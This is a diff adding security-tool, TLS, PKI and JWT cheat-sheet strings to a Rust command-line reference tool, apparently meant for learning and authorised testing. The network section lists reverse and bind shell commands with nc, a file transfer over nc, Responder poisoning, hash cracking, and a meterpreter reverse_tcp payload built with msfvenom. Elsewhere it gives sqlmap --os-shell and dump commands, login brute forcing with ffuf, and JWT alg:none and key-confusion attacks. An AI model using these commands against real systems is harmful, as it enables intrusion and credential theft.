@@ -57922,3 +57922,1794 @@ pub fn data_pipeline_calc(query: &str) -> String {
             .join(", ")
     )
 }
+
+// ═══════════════════════════════════════════════════════════════════════════
+// Wave 39: --security-tools, --crypto-adv, --browser-dev, --rust-async
+// ═══════════════════════════════════════════════════════════════════════════
+
+// ── security-tools ────────────────────────────────────────────────────────────
+
+fn s_sec_nmap() -> &'static str {
+    "nmap Reference
+Basic scans:
+  nmap 192.168.1.1                 # default SYN scan (TCP top 1000 ports)
+  nmap -sV 192.168.1.1             # version detection
+  nmap -sC 192.168.1.1             # default scripts
+  nmap -sV -sC 192.168.1.1         # version + scripts
+  nmap -A 192.168.1.1              # aggressive: OS, version, scripts, traceroute
+  nmap -p 22,80,443 192.168.1.1    # specific ports
+  nmap -p 1-65535 192.168.1.1      # all ports
+  nmap -p- 192.168.1.1             # all 65535 ports (shorthand)
+
+Scan types:
+  -sS  SYN scan (stealth; half-open; default for root)
+  -sT  TCP connect scan (full; no root needed)
+  -sU  UDP scan (slow; add -sS for combined TCP+UDP)
+  -sN  NULL scan (no flags)
+  -sF  FIN scan
+  -sX  Xmas scan
+
+Host discovery:
+  nmap -sn 192.168.1.0/24          # ping scan (no port scan)
+  nmap -sn -PR 192.168.1.0/24      # ARP ping (local network)
+  nmap -sL 192.168.1.0/24          # list targets without scanning
+
+Speed and timing:
+  -T0  paranoid (very slow; IDS evasion)
+  -T1  sneaky
+  -T3  normal (default)
+  -T4  aggressive (fast LAN)
+  -T5  insane (may miss results)
+  --min-rate 1000                  # minimum packets/sec
+  --max-retries 2
+
+Output formats:
+  -oN output.txt    # normal text
+  -oX output.xml    # XML
+  -oG output.gnmap  # grepable
+  -oA basename      # all three formats
+
+NSE Scripts:
+  nmap --script=http-title 192.168.1.1
+  nmap --script=vuln 192.168.1.1         # vulnerability scripts
+  nmap --script=ssl-enum-ciphers         # TLS cipher enumeration
+  nmap --script=http-auth-finder         # HTTP auth methods
+  nmap --script=banner 192.168.1.1       # grab service banners
+  Scripts located: /usr/share/nmap/scripts/
+  nmap --script-updatedb                 # update script database
+
+Evasion:
+  -f                # fragment packets
+  -D RND:10         # decoy scan (10 random decoys)
+  --data-length 25  # pad packets
+  --spoof-mac 0     # random MAC
+  nmap --source-port 53  # use port 53 (DNS; often allowed)
+
+OS detection:
+  -O                # OS detection (requires root)
+  --osscan-guess    # aggressive guess"
+}
+
+fn s_sec_web() -> &'static str {
+    "Web Security Testing Tools
+OWASP ZAP:
+  docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable zap-baseline.py -t https://example.com
+  docker run owasp/zap2docker-stable zap-full-scan.py -t https://example.com -r report.html
+  Modes: Spider → Active Scan → Passive Scan
+  API testing: import OpenAPI/Swagger spec → auto-generate test cases
+  ZAP Desktop: proxy traffic at 127.0.0.1:8080; intercept + replay requests
+  zap-cli: command-line wrapper for CI pipelines
+
+Burp Suite:
+  Proxy: intercept/modify HTTP/HTTPS at 127.0.0.1:8080
+  Scanner: active + passive vulnerability scanner
+  Intruder: fuzzing / brute-force (cluster bomb, sniper, pitchfork attacks)
+  Repeater: manual request replay + modification
+  Decoder: Base64, URL, HTML, hex encode/decode
+  Comparer: diff two responses
+  Install Burp CA cert in browser for HTTPS: Proxy → Options → CA Certificate
+
+sqlmap (SQL injection):
+  sqlmap -u 'http://site.com/page?id=1' --dbs
+  sqlmap -u 'http://site.com/page?id=1' -D dbname --tables
+  sqlmap -u 'http://site.com/page?id=1' -D dbname -T users --dump
+  sqlmap -u 'http://site.com/page?id=1' --os-shell    # OS command execution
+  sqlmap --forms -u http://site.com/login              # auto-find forms
+  sqlmap --level=5 --risk=3                            # deeper testing
+
+nikto (web server scanner):
+  nikto -h http://target.com
+  nikto -h https://target.com -ssl
+  nikto -h target.com -p 8080
+
+ffuf (web fuzzer / directory brute-force):
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://target.com/FUZZ
+  ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301  # filter by status
+  ffuf -w wordlist.txt -u http://target.com/ -H 'Host: FUZZ.target.com'  # vhost fuzzing
+  ffuf -w users.txt:USER -w passwords.txt:PASS -u http://target.com/login -d 'user=USER&pass=PASS' -fc 302
+
+gobuster / dirsearch:
+  gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
+  dirsearch -u http://target.com -e php,html
+
+OWASP Top 10 (2021):
+  A01 Broken Access Control
+  A02 Cryptographic Failures
+  A03 Injection (SQL, NoSQL, LDAP, OS)
+  A04 Insecure Design
+  A05 Security Misconfiguration
+  A06 Vulnerable/Outdated Components
+  A07 Identification/Authentication Failures
+  A08 Software/Data Integrity Failures
+  A09 Security Logging/Monitoring Failures
+  A10 SSRF (Server-Side Request Forgery)"
+}
+
+fn s_st_sast() -> &'static str {
+    "SAST / Container / Dependency Scanning
+Semgrep (SAST):
+  semgrep --config auto .                    # run all auto-detected rules
+  semgrep --config p/owasp-top-ten .         # OWASP Top 10 rules
+  semgrep --config p/security-audit .        # security audit
+  semgrep --config p/secrets .               # secret detection
+  semgrep --json --output results.json .     # JSON output for CI
+  semgrep --exclude 'test_*' .               # exclude test files
+  Custom rule:
+    id: my-rule
+    patterns:
+    - pattern: eval(...)
+    message: Avoid eval; use safer alternative
+    languages: [python]
+    severity: ERROR
+
+Trivy (container + filesystem scanner):
+  trivy image nginx:latest                    # scan Docker image
+  trivy image --severity HIGH,CRITICAL nginx  # filter severity
+  trivy fs .                                  # scan filesystem
+  trivy repo https://github.com/org/repo      # scan git repo
+  trivy config ./kubernetes/                  # scan IaC configs
+  trivy image --format json -o report.json nginx  # JSON output
+  trivy image --ignore-unfixed nginx          # skip unfixed CVEs
+  trivy plugin install referrer               # extend with plugins
+  Integration: trivy image --exit-code 1 --severity CRITICAL nginx  # fail CI
+
+Snyk:
+  snyk test                                   # scan dependencies
+  snyk container test nginx:latest            # scan container
+  snyk iac test ./k8s/                        # scan Kubernetes manifests
+  snyk code test                              # SAST scan
+  snyk monitor                                # upload results to Snyk dashboard
+  snyk fix                                    # auto-fix vulnerabilities
+
+OWASP Dependency-Check:
+  dependency-check.sh --project myapp --scan ./lib --out ./report
+
+GitLeaks (secret scanning):
+  gitleaks detect --source .                  # scan working directory
+  gitleaks detect --source . --report-format json --report-path leak.json
+  gitleaks protect --staged                   # pre-commit hook
+
+TruffleHog:
+  trufflehog git file://./path/to/repo --only-verified
+  trufflehog github --repo https://github.com/org/repo
+
+grype (vulnerability scanner):
+  grype ubuntu:latest
+  grype dir:.
+  grype sbom:./sbom.json
+  syft . -o json > sbom.json && grype sbom:./sbom.json  # SBOM workflow"
+}
+
+fn s_sec_network() -> &'static str {
+    "Network Security Tools
+Wireshark / tshark:
+  tshark -i eth0                             # capture on interface
+  tshark -i eth0 -w capture.pcap             # save to file
+  tshark -r capture.pcap                     # read pcap
+  tshark -r capture.pcap -Y 'http.request'  # display filter
+  tshark -r capture.pcap -T json             # JSON output
+  Useful display filters:
+    http                      HTTP traffic
+    http.request.method==POST POST requests only
+    tcp.port==443             HTTPS traffic
+    ip.addr==192.168.1.100    traffic to/from IP
+    dns                       DNS queries
+    tcp.flags.syn==1          SYN packets
+
+tcpdump:
+  tcpdump -i eth0                            # capture on interface
+  tcpdump -i eth0 port 80                    # filter by port
+  tcpdump -i eth0 host 192.168.1.1           # filter by host
+  tcpdump -i eth0 -w out.pcap                # write to file
+  tcpdump -r out.pcap                        # read pcap
+  tcpdump -i eth0 'tcp and port 443'         # BPF filter
+
+netcat (nc):
+  nc -lvnp 4444                              # listen (reverse shell)
+  nc target.com 4444                         # connect
+  nc -z target.com 1-1000                    # port scan
+  nc -e /bin/bash target.com 4444            # bind shell (attacker's view)
+  cat file.txt | nc target.com 9999          # file transfer
+  nc -l 9999 > file.txt                      # receive file
+
+Responder (LLMNR/NBT-NS poisoning):
+  responder -I eth0 -wrdv
+  # captures NTLMv2 hashes on local network
+  # use with hashcat: hashcat -m 5600 hash.txt wordlist.txt
+
+John the Ripper / Hashcat:
+  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+  john --format=bcrypt --wordlist=rockyou.txt hash.txt
+  hashcat -m 0 hash.txt rockyou.txt            # MD5
+  hashcat -m 1000 hash.txt rockyou.txt         # NTLM
+  hashcat -m 5600 hash.txt rockyou.txt         # NTLMv2
+  hashcat -m 1800 hash.txt rockyou.txt         # sha512crypt
+
+Metasploit basics:
+  msfconsole
+  search <exploit>
+  use exploit/multi/handler
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  set LHOST <ip>; set LPORT 4444
+  run
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > shell.exe"
+}
+
+fn s_sec_hardening() -> &'static str {
+    "Security Hardening & Compliance
+Linux hardening:
+  sysctl -w kernel.randomize_va_space=2    # ASLR
+  sysctl -w net.ipv4.ip_forward=0          # disable IP forwarding
+  sysctl -w net.ipv4.tcp_syncookies=1      # SYN flood protection
+  chmod 700 /home/user                     # home dir permissions
+  passwd -l root                           # lock root account
+  chattr +i /etc/passwd                    # immutable passwd file
+  auditd: track file access, privilege use, network connections
+  Fail2ban: ban IPs after failed SSH/login attempts
+  AppArmor/SELinux: mandatory access control
+
+SSH hardening (/etc/ssh/sshd_config):
+  PermitRootLogin no
+  PasswordAuthentication no
+  PubkeyAuthentication yes
+  MaxAuthTries 3
+  AllowUsers specific_user
+  Port 2222                              # non-standard port (minor obscurity)
+  ClientAliveInterval 300
+  ClientAliveCountMax 2
+
+CIS Benchmarks:
+  CIS-CAT scanner: automated compliance checking
+  Levels: Level 1 (basic, low impact) / Level 2 (defense-in-depth)
+  Key checks: password policy, SSH config, audit logging, filesystem mounts
+  ansible-lockdown: Ansible roles for CIS compliance
+
+OpenSCAP:
+  oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis \
+    --results scan.xml ssg-rhel9-ds.xml
+  Generates: HTML report + machine-readable XML
+
+Docker hardening:
+  Run as non-root: USER 1001 in Dockerfile
+  Read-only filesystem: --read-only
+  Drop capabilities: --cap-drop ALL --cap-add NET_BIND_SERVICE
+  No-new-privileges: --security-opt=no-new-privileges:true
+  Seccomp profile: --security-opt seccomp=profile.json
+  AppArmor: --security-opt apparmor=docker-default
+  Trivy scan: trivy image myapp:latest
+
+Security headers (HTTP):
+  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+  Content-Security-Policy: default-src 'self'
+  X-Frame-Options: DENY
+  X-Content-Type-Options: nosniff
+  Referrer-Policy: no-referrer-when-downgrade
+  Permissions-Policy: camera=(), microphone=(), geolocation=()
+  Check: securityheaders.com
+
+Penetration testing phases:
+  1. Reconnaissance: OSINT, Shodan, theHarvester, Maltego
+  2. Scanning: nmap, masscan, Nessus/OpenVAS
+  3. Exploitation: Metasploit, manual exploit
+  4. Post-exploitation: privilege escalation, lateral movement
+  5. Reporting: executive summary + technical findings + remediation"
+}
+
+fn s_sec_cloud() -> &'static str {
+    "Cloud Security Tools
+AWS Security:
+  aws iam get-account-summary           # IAM overview
+  aws iam list-users --query 'Users[*].UserName'
+  aws iam simulate-principal-policy     # test IAM permissions
+  aws s3api get-bucket-acl --bucket name  # check bucket ACL
+  aws s3api get-bucket-policy --bucket name
+  aws ec2 describe-security-groups      # review SGs
+  aws cloudtrail lookup-events          # audit log search
+  aws guardduty list-findings           # threat findings
+  aws config get-compliance-details-by-config-rule --config-rule-name S3_BUCKET_PUBLIC_READ_PROHIBITED
+
+ScoutSuite (cloud security auditing):
+  scout aws                             # full AWS audit
+  scout azure                           # Azure audit
+  scout gcp                             # GCP audit
+  HTML report: scoutsuite-report/
+
+Prowler (AWS/Azure/GCP security):
+  prowler aws                           # full AWS audit
+  prowler aws --service s3 iam          # specific services
+  prowler aws -M csv,json               # multiple output formats
+
+CloudSploit: continuous cloud security scanning
+
+Kubernetes security:
+  kube-bench: CIS Kubernetes benchmark
+    kube-bench run --targets master,node
+  kube-hunter: pen test Kubernetes clusters
+    kube-hunter --remote <ip>
+  kubeaudit: audit Kubernetes cluster
+    kubeaudit all -f deployment.yaml
+  Falco: runtime threat detection (syscall monitoring)
+    falco -r /etc/falco/falco_rules.yaml
+  Polaris: Kubernetes best practices
+    polaris audit --audit-path ./k8s/
+
+Secret management:
+  HashiCorp Vault:
+    vault server -dev
+    vault kv put secret/myapp password=s3cr3t
+    vault kv get secret/myapp
+    vault token create -policy=my-policy
+  AWS Secrets Manager: aws secretsmanager get-secret-value --secret-id myapp/prod/db
+  Sealed Secrets (k8s): kubeseal --cert pub-cert.pem < secret.yaml > sealed.yaml
+  External Secrets Operator: sync cloud secrets into k8s as native Secrets
+
+SIEM / detection:
+  Elastic SIEM: ECS-normalized events, detection rules, timelines
+  Splunk: SPL queries, alert actions, correlation searches
+  Wazuh: open-source XDR/SIEM (OSSEC fork); agent-based log collection
+  Suricata: IDS/IPS; network traffic analysis; EVE JSON logs
+  Zeek (Bro): network security monitoring; connection logs, DNS, HTTP, SSL"
+}
+
+type SecurityToolsSection = (&'static str, &'static [&'static str], fn() -> &'static str);
+const SECURITY_TOOLS_SECTIONS: &[SecurityToolsSection] = &[
+    (
+        "nmap",
+        &[
+            "nmap-scan",
+            "nmap-scripts",
+            "nse-scripts",
+            "port-scanning",
+            "nmap-timing",
+            "nmap-output",
+            "nmap-evasion",
+            "nmap-os",
+            "nmap-udp",
+            "nmap-syn",
+            "nmap-version",
+            "nmap-all-ports",
+            "masscan",
+        ],
+        s_sec_nmap,
+    ),
+    (
+        "web",
+        &[
+            "web-security",
+            "owasp-zap",
+            "burp-suite",
+            "burp-proxy",
+            "sqlmap",
+            "nikto",
+            "ffuf",
+            "gobuster",
+            "dirsearch",
+            "owasp-top-10",
+            "web-fuzzing",
+            "directory-bruteforce",
+            "vhost-fuzzing",
+        ],
+        s_sec_web,
+    ),
+    (
+        "sast",
+        &[
+            "semgrep",
+            "trivy-scan",
+            "snyk",
+            "dependency-check",
+            "gitleaks",
+            "secret-scanning",
+            "trufflehog",
+            "grype",
+            "sbom",
+            "container-scanning",
+            "iac-scan",
+            "code-scanning",
+            "supply-chain-security",
+        ],
+        s_st_sast,
+    ),
+    (
+        "network",
+        &[
+            "wireshark",
+            "tshark",
+            "tcpdump",
+            "netcat-sec",
+            "responder",
+            "hashcat",
+            "john-ripper",
+            "metasploit",
+            "msfvenom",
+            "pcap-analysis",
+            "llmnr-poisoning",
+            "password-cracking",
+            "bpf-filter",
+        ],
+        s_sec_network,
+    ),
+    (
+        "hardening",
+        &[
+            "linux-hardening",
+            "ssh-hardening",
+            "cis-benchmark",
+            "openscap",
+            "docker-hardening",
+            "security-headers",
+            "fail2ban",
+            "apparmor",
+            "selinux",
+            "pentest-phases",
+            "http-security-headers",
+            "sysctl-hardening",
+        ],
+        s_sec_hardening,
+    ),
+    (
+        "cloud-sec",
+        &[
+            "aws-security",
+            "cloud-security",
+            "scoutsuite",
+            "prowler",
+            "kube-bench",
+            "kube-hunter",
+            "falco-security",
+            "vault-secrets",
+            "sealed-secrets",
+            "external-secrets",
+            "wazuh-siem",
+            "suricata-ids",
+            "zeek-monitor",
+        ],
+        s_sec_cloud,
+    ),
+];
+
+pub fn security_tools_calc(query: &str) -> String {
+    let q = query.trim().to_lowercase();
+    if q.is_empty() || q == "list" || q == "help" {
+        let topics: Vec<&str> = SECURITY_TOOLS_SECTIONS.iter().map(|(n, _, _)| *n).collect();
+        return format!(
+            "security-tools topics: {}\nUse: --security-tools <topic>  or  --security-tools all",
+            topics.join(", ")
+        );
+    }
+    if q == "all" {
+        return SECURITY_TOOLS_SECTIONS
+            .iter()
+            .map(|(n, _, f)| format!("── {} ──\n{}", n, f()))
+            .collect::<Vec<_>>()
+            .join("\n\n");
+    }
+    for (name, aliases, func) in SECURITY_TOOLS_SECTIONS {
+        if q == *name || aliases.iter().any(|a| q == *a || q.contains(a)) {
+            return func().to_string();
+        }
+    }
+    format!(
+        "Unknown security-tools topic: '{}'\nAvailable: {}",
+        query.trim(),
+        SECURITY_TOOLS_SECTIONS
+            .iter()
+            .map(|(n, _, _)| *n)
+            .collect::<Vec<_>>()
+            .join(", ")
+    )
+}
+
+// ── crypto-adv ────────────────────────────────────────────────────────────────
+
+fn s_ca_tls() -> &'static str {
+    "TLS Deep Dive
+TLS 1.3 handshake (simplified):
+  1. ClientHello: supported cipher suites, key_share (ECDHE public key), SNI
+  2. ServerHello: chosen cipher, key_share (server ECDHE public key)
+     → Both sides compute shared secret (ECDHE); derive handshake keys
+  3. Server: Certificate, CertificateVerify, Finished (encrypted)
+  4. Client: Finished (encrypted)
+  → Handshake complete in 1 RTT (0-RTT possible with session resumption)
+
+TLS 1.3 key features vs 1.2:
+  No RSA key exchange (forward secrecy only via ECDHE)
+  No SHA-1, MD5, RC4, DES, 3DES
+  Cipher suites reduced: TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256
+  Encrypted handshake (server certificate encrypted)
+  0-RTT resumption (early data; replay attack risk — use with care)
+
+Certificate chain:
+  Leaf cert → Intermediate CA cert(s) → Root CA cert
+  Browser trusts root CA (baked into OS/browser trust store)
+  OCSP: Online Certificate Status Protocol (real-time revocation check)
+  CRL: Certificate Revocation List (batch revocation)
+  OCSP Stapling: server staples OCSP response to avoid client round-trip
+
+openssl commands:
+  openssl s_client -connect example.com:443 -servername example.com
+  openssl s_client -connect example.com:443 | openssl x509 -text -noout
+  openssl x509 -in cert.pem -text -noout         # inspect certificate
+  openssl verify -CAfile chain.pem cert.pem       # verify cert chain
+  openssl s_client -tls1_3 -connect example.com:443  # force TLS 1.3
+  openssl ciphers -v 'TLSv1.3'                   # list TLS 1.3 ciphers
+  openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+  openssl dhparam -out dhparam.pem 4096           # DH params
+
+Cipher suite anatomy (TLS 1.2):
+  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+  │         │    │    │         │
+  Protocol  KEX  Auth  Enc      MAC
+  KEX: key exchange (ECDHE = perfect forward secrecy)
+  Auth: certificate verification (RSA or ECDSA)
+  Enc: symmetric cipher (AES-256-GCM = authenticated encryption)
+  MAC: hash (SHA-384 for PRF, not HMAC in GCM mode)
+
+NGINX TLS config:
+  ssl_protocols TLSv1.2 TLSv1.3;
+  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384;
+  ssl_prefer_server_ciphers off;   # TLS 1.3: client choice; TLS 1.2: server choice
+  ssl_session_timeout 1d;
+  ssl_session_cache shared:MozSSL:10m;
+  ssl_stapling on;
+  ssl_stapling_verify on;
+  add_header Strict-Transport-Security 'max-age=63072000' always;"
+}
+
+fn s_ca_pki() -> &'static str {
+    "PKI, Certificates & ACME
+Certificate types:
+  DV (Domain Validated): verify domain ownership only; fast; Let's Encrypt
+  OV (Organization Validated): verify org identity; browsers show org name
+  EV (Extended Validated): full org verification; green bar (now deprecated in UI)
+  Wildcard: *.example.com; covers all subdomains; one level only
+  SAN (Subject Alternative Names): multiple domains in one cert (modern standard)
+  mTLS client cert: client authenticates to server
+
+X.509 certificate fields:
+  Subject: CN=example.com, O=Example Inc, C=US
+  Issuer: intermediate CA
+  SAN: DNS:example.com, DNS:www.example.com
+  Not Before / Not After: validity period
+  Public Key: RSA 4096 or ECDSA P-256
+  Key Usage: Digital Signature, Key Encipherment
+  Extended Key Usage: TLS Web Server Authentication
+  Subject Key Identifier (SKID) / Authority Key Identifier (AKID)
+  Certificate Policies: OID + CPS URL
+
+Let's Encrypt / ACME:
+  certbot --nginx -d example.com -d www.example.com
+  certbot certonly --webroot -w /var/www/html -d example.com  # webroot
+  certbot certonly --standalone -d example.com                # standalone
+  certbot certonly --dns-cloudflare -d '*.example.com'        # wildcard via DNS
+  certbot renew --dry-run                                      # test renewal
+  Auto-renewal: cron or systemd timer runs certbot renew twice daily
+  Files: /etc/letsencrypt/live/example.com/{cert,chain,fullchain,privkey}.pem
+
+acme.sh (lightweight):
+  acme.sh --issue -d example.com --webroot /var/www/html
+  acme.sh --install-cert -d example.com --cert-file /etc/ssl/cert.pem --key-file /etc/ssl/key.pem
+
+Private CA with CFSSL:
+  cfssl gencert -initca ca-csr.json | cfssljson -bare ca
+  cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=server server-csr.json | cfssljson -bare server
+
+Private CA with openssl:
+  mkdir -p ca/{certs,crl,newcerts,private}; touch ca/index.txt; echo 1000 > ca/serial
+  openssl genrsa -aes256 -out ca/private/ca.key.pem 4096
+  openssl req -new -x509 -days 3650 -key ca/private/ca.key.pem -out ca/certs/ca.cert.pem -extensions v3_ca
+
+cert-manager (Kubernetes):
+  kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.14.0/cert-manager.yaml
+  ClusterIssuer (Let's Encrypt):
+    apiVersion: cert-manager.io/v1
+    kind: ClusterIssuer
+    metadata: {name: letsencrypt-prod}
+    spec:
+      acme:
+        server: https://acme-v02.api.letsencrypt.org/directory
+        email: admin@example.com
+        privateKeySecretRef: {name: letsencrypt-prod}
+        solvers: [{http01: {ingress: {class: nginx}}}]
+  Certificate:
+    spec: {secretName: myapp-tls, issuerRef: {name: letsencrypt-prod, kind: ClusterIssuer}, dnsNames: [example.com]}"
+}
+
+fn s_ca_jwt_adv() -> &'static str {
+    "JWT Advanced & PASETO
+JWT structure:
+  Header.Payload.Signature  (base64url encoded, dot-separated)
+  Header: {\"alg\":\"RS256\",\"typ\":\"JWT\"}
+  Payload: {\"sub\":\"user123\",\"iss\":\"https://auth.example.com\",\"aud\":\"api.example.com\",\"exp\":1735689600,\"iat\":1735603200,\"jti\":\"unique-id\"}
+  Signature: RSASHA256(base64UrlEncode(header) + '.' + base64UrlEncode(payload), privateKey)
+
+JWT algorithms:
+  HS256/384/512: HMAC-SHA; symmetric (same key signs and verifies); avoid sharing secret
+  RS256/384/512: RSA PKCS#1 v1.5; asymmetric; private key signs, public key verifies
+  ES256/384/512: ECDSA; asymmetric; smaller signatures than RSA; preferred
+  PS256/384/512: RSA-PSS; stronger padding than PKCS#1 v1.5
+  EdDSA (Ed25519): most modern; very fast; small keys + signatures
+  NONE: NEVER use in production — unsigned tokens accepted by broken libraries
+
+JWT vulnerabilities:
+  alg:none attack: set alg to none, remove signature → verify check bypassed
+  Algorithm confusion: server expects RS256, attacker sends HS256 with public key as HMAC secret
+  Fix: pin expected algorithm in verification code; never accept alg from token header
+  Weak secret: brute-force HS256 tokens with short secrets (jwt_tool, hashcat -m 16500)
+  Missing exp check: tokens valid forever if exp not validated
+  Missing iss/aud validation: tokens from other services accepted
+
+jwt_tool:
+  python3 jwt_tool.py <token>                   # decode
+  python3 jwt_tool.py <token> -T               # tamper
+  python3 jwt_tool.py <token> -X a             # test alg:none
+  python3 jwt_tool.py <token> -X k -pk pub.pem  # RS→HS confusion attack
+
+PASETO (Platform-Agnostic Security Tokens):
+  Eliminates JWT algorithm confusion by baking algorithm into version
+  v4.local: symmetric encryption (XChaCha20-Poly1305 + BLAKE2b)
+  v4.public: asymmetric signing (Ed25519)
+  No alg header; version determines cryptography
+  Payload: base64url-encoded JSON; encrypted (local) or signed (public)
+
+OIDC (OpenID Connect) tokens:
+  id_token: JWT; proves identity; for client app; MUST verify sig + exp + aud + iss
+  access_token: JWT or opaque; for API access; validate at resource server
+  refresh_token: opaque; long-lived; exchange for new access tokens
+  Discovery: GET https://issuer/.well-known/openid-configuration
+  JWKS: public keys for verifying JWTs at /.well-known/jwks.json
+
+JWT best practices:
+  Short expiry: 15m for access tokens; 7d for refresh tokens
+  Rotate refresh tokens on use (refresh token rotation)
+  Include jti for revocation list (rate of revocation determines tradeoff)
+  Validate all claims: exp, nbf, iss, aud, sub
+  Use asymmetric keys (RS256/ES256): separate signing and verification
+  Store in httpOnly, Secure, SameSite=Strict cookie (not localStorage)"
+}
+
+fn s_ca_crypto_primitives() -> &'static str {
+    "Cryptographic Primitives Reference
+Symmetric encryption:
+  AES-256-GCM: authenticated encryption (confidentiality + integrity); 96-bit nonce
+  ChaCha20-Poly1305: fast on systems without AES-NI; RFC 8439; used in TLS 1.3
+  AES-256-CBC: encryption only; requires separate HMAC; avoid new designs
+  Block size: AES = 128-bit; key size: 128/192/256-bit
+  Nonce/IV: never reuse! GCM nonce reuse catastrophically breaks authentication
+
+Asymmetric encryption:
+  RSA-OAEP: padding-safe RSA encryption; never use PKCS#1 v1.5 for new code
+  ECDH / X25519: key agreement (Diffie-Hellman over elliptic curves)
+  ElGamal: rarely used directly; basis of other systems
+
+Digital signatures:
+  Ed25519: fast, 256-bit security, deterministic; preferred for new systems
+  ECDSA P-256: NIST standard; needs secure randomness per signature
+  RSA-PSS: safer padding than PKCS#1 v1.5; use 4096-bit for new RSA
+  Always sign the hash of the data, not the raw data
+
+Hash functions:
+  SHA-256: 32-byte digest; collision-resistant; use for most hashing
+  SHA-3 (Keccak): alternative design; use when SHA-2 algorithm diversity needed
+  BLAKE2b: faster than SHA-256; not NIST standard but widely reviewed
+  MD5 / SHA-1: broken for collision resistance; NEVER for security; OK for checksums
+  HMAC-SHA-256: keyed MAC; authenticate messages; PRF
+
+Key derivation functions (KDF):
+  Argon2id: memory-hard; winner of PHC; use for password hashing
+    argon2id($password, $salt, memory=65536, iterations=3, parallelism=4)
+  bcrypt: widely deployed; work factor 12+ for new systems
+  scrypt: memory-hard; N=32768, r=8, p=1 minimum
+  PBKDF2-HMAC-SHA256: NIST-approved; iterations ≥ 310000 (OWASP 2023)
+  HKDF: for deriving multiple keys from a single shared secret (not passwords)
+
+Random number generation:
+  os.urandom(32) / crypto.getRandomValues / /dev/urandom: cryptographically secure
+  NEVER use: Math.random(), rand(), python random module for secrets
+  UUID v4: 122 bits of randomness; suitable for non-secret IDs
+  Nonce generation: always use CSPRNG; never counter or timestamp alone
+
+Encoding (not encryption):
+  Base64: 3 bytes → 4 chars; +/= padding; base64url for URLs (replaces +/ with -_)
+  Hex: 1 byte → 2 hex chars; common for hashes and keys in text
+  Base58: no 0/O/I/l ambiguity; used in Bitcoin addresses
+  Encoding is reversible and provides NO security
+
+Key sizes (minimum 2025):
+  RSA: 3072+ (4096 preferred)
+  ECC: P-256 / Curve25519 (128-bit security)
+  AES: 128+ (256 for long-term; quantum margin)
+  Hash: SHA-256+ (SHA-1 broken)"
+}
+
+fn s_ca_mtls() -> &'static str {
+    "mTLS & Certificate Authentication
+mTLS overview:
+  Mutual TLS: both server AND client present X.509 certificates
+  Standard TLS: only server authenticates; client anonymous
+  Use cases: microservices, API clients, VPN, IoT device auth
+
+NGINX mTLS server config:
+  server {
+    listen 443 ssl;
+    ssl_certificate /etc/ssl/server.crt;
+    ssl_certificate_key /etc/ssl/server.key;
+    ssl_client_certificate /etc/ssl/ca.crt;    # CA that issued client certs
+    ssl_verify_client on;                       # require client cert
+    ssl_verify_depth 2;                         # allow intermediate CAs
+    # Access client cert fields
+    proxy_set_header X-Client-DN $ssl_client_s_dn;
+    proxy_set_header X-Client-Verify $ssl_client_verify;
+  }
+
+Generating client certificates:
+  # Generate client key + CSR
+  openssl genrsa -out client.key 4096
+  openssl req -new -key client.key -out client.csr -subj '/CN=client1/O=MyOrg'
+  # Sign with CA
+  openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365
+  # Bundle for browser/curl
+  openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12
+
+Test with curl:
+  curl --cert client.crt --key client.key --cacert ca.crt https://server.example.com
+
+Go mTLS client:
+  cert, _ := tls.LoadX509KeyPair(\"client.crt\", \"client.key\")
+  caCert, _ := os.ReadFile(\"ca.crt\")
+  caCertPool := x509.NewCertPool()
+  caCertPool.AppendCertsFromPEM(caCert)
+  tlsConfig := &tls.Config{
+      Certificates: []tls.Certificate{cert},
+      RootCAs:      caCertPool,
+  }
+  transport := &http.Transport{TLSClientConfig: tlsConfig}
+  client := &http.Client{Transport: transport}
+
+Go mTLS server:
+  tlsConfig := &tls.Config{
+      ClientCAs:  caCertPool,
+      ClientAuth: tls.RequireAndVerifyClientCert,
+  }
+  server := &http.Server{Addr: \":8443\", TLSConfig: tlsConfig}
+  server.ListenAndServeTLS(\"server.crt\", \"server.key\")
+
+SPIFFE/SPIRE mTLS:
+  Workload API: unix socket at /run/spire/sockets/agent.sock
+  SVID: SPIFFE Verifiable Identity Document (X.509 cert or JWT)
+  Rotation: auto-rotated short-lived certs (default 1h)
+  Go SDK: workloadapi.NewX509Source → get SVIDs → tls.Config
+
+Certificate pinning:
+  Pin public key hash (SPKI): hash of SubjectPublicKeyInfo
+  More flexible than pinning full cert (survives cert renewal with same key)
+  Go: sha256.Sum256(cert.RawSubjectPublicKeyInfo)
+  HTTP Public Key Pinning (HPKP): deprecated in browsers; still useful in mobile apps
+  Risk: if pinned key is lost, service becomes unreachable"
+}
+
+type CryptoAdvSection = (&'static str, &'static [&'static str], fn() -> &'static str);
+const CRYPTO_ADV_SECTIONS: &[CryptoAdvSection] = &[
+    (
+        "tls",
+        &[
+            "tls-deep-dive",
+            "tls13",
+            "tls-handshake",
+            "tls-cipher-suite",
+            "tls-certificates",
+            "openssl-tls",
+            "tls-termination",
+            "tls-inspection",
+            "tls-nginx",
+            "nginx-ssl",
+            "cipher-suites",
+            "ocsp-stapling",
+        ],
+        s_ca_tls,
+    ),
+    (
+        "pki",
+        &[
+            "certificate-chain",
+            "ca-certificates",
+            "lets-encrypt",
+            "acme-protocol",
+            "certbot",
+            "cert-manager",
+            "cfssl",
+            "private-ca",
+            "certificate-types",
+            "x509",
+            "san-cert",
